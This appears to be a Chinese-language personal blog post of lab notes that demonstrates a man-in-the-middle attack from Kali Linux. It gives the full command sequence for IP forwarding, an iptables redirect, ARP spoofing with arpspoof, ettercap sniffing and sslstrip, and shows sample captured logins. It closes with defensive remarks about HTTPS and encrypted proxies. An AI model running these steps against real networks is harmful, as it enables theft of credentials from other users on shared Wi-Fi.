title: MITM中间人攻击
date: 2015-05-18 21:48:00
tags:
- MITM
- Penetration
- Kali
permalink: Man-in-the-Middle-Attack
---

## 一、说明

整理了一下去年的笔记，简单记录Kali Linux中中间人（Man-in-the-middle， MITM）攻击的过程，该攻击手段常用于公开Wi-Fi网络中窃取用户信息。

本例中：

设备 | IP地址
--- | ---
网关IP | 10.10.10.2
Kali Linux 1.1.0a | 10.10.10.128
目标计算机 Windows XP SP3 | 10.10.10.129

使用到的工具有：`ettercap`、`arpspoof`、`sslstrip.py`

## 二、实施攻击

可以先用`namp`工具扫描一下局域网中在线的主机：
```bash
nmap 10.10.10.1/24
```

### 1) 编辑etter.conf
```bash
# if you use iptables:
    #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
```
去掉`iptables`下`redir_command_on`之前的`#`，打开iptables功能。

### 2) 打开Linux核心封包转递功能
```bash
root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 3) 设置转发
```bash
root@kali:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```
把80端口的数据转发到8080端口上，之后可以使用ettercap和sslstrip监听这个端口。

### 4) 执行arp欺骗
```bash
root@kali:~# arpspoof  -i eth0 -t 10.10.10.129 10.10.10.2
```
其中`10.10.10.129`是要欺骗的目标机器IP地址，`10.10.10.2`是要伪装成为的网关IP地址。

### 5) 启动ettercap
新打开一个Terminal，启动ettercap，嗅探8080端口的数据：
```bash
root@kali:~# ettercap -T -q -l 8080 -i eth0
```

### 6) 启动sslstrip.py
新打开一个Terminal，进入sslstrip的目录，启动sslstrip.py，分析8080端口的数据，信息将写入目录下的log文件：
```bash
root@kali:~# cd /usr/share/sslstrip/
root@kali:/usr/share/sslstrip# python sslstrip.py -k -l 8080 -w log
```

## 三、接下来...

### 1) http中间人攻击

在目标及其中打开`http://login.live.com/`测试，输入用户名密码，点击登陆，在Kali的ettercap Terminal中会显示嗅探到的`USER`与`PASS`分别为`g2ex@live.com`和`123456`：

```bash
HTTP : 131.253.61.100:80 -> USER: g2ex@live.com  PASS: 123456  INFO: http://login.live.com/login.srf?wa=wsignin1.0&ct=1431940505&rver=6.1.6206.0&sa=1&ntprob=-1&wp=MBI_SSL_SHARED&wreply=https://mail.live.com/?owa=1&owas
```

### 2) HTTPS中间人攻击

因为现阶段Chrome、Firefox和高版本IE都会对伪造的证书进行错误提醒，SSL的中间人攻击已经很容易被察觉。这里为了方便演示，嗅探Yahoo的用户名密码，当使用Firefox提示不受信任的连接时，将网站添加到例外，或者使用IE6访问`https://login.yahoo.com/`，输入用户名密码，点击`Sign In`，在Kali的ettercap Terminal中会显示嗅探到的`USER`与`PASS`分别为`g2ex@yahoo.com`和`123456`：
```bash
HTTP : 98.136.189.41:443 -> USER: g2ex@yahoo.com  PASS: 123456  INFO: https://login.yahoo.com/
```

这时，也可以查看sslstrip.py目录中的log文件，里边已经记录了一些用户名密码了。

## 四、总结

针对HTTP非加密的连接，MITM攻击发生时目标机器是没有感知的，中间人可以截取、修改数据，也可以加入广告、恶意Javascript，比如前段时间大炮攻击Github等网站的事件。

而针对HTTPS的MITM攻击有一定的局限性，除非电脑里已经安装了恶意的证书，否则Chrome、Firefox和最新的IE都会提示证书问题阻止进一步地访问。让人欣喜的是，越来越多的网站加入SSL/TSL行列，常见重要站点的登陆界面也都支持了HTTPS或者私有协议。尤其是当Chrome、Firefox宣布删除CNNIC数字证书之后，我们被GFW中间人的机会就大大减小。

连接不信任的网络，还是老老实实用自己的加密代理吧，踏实、放心。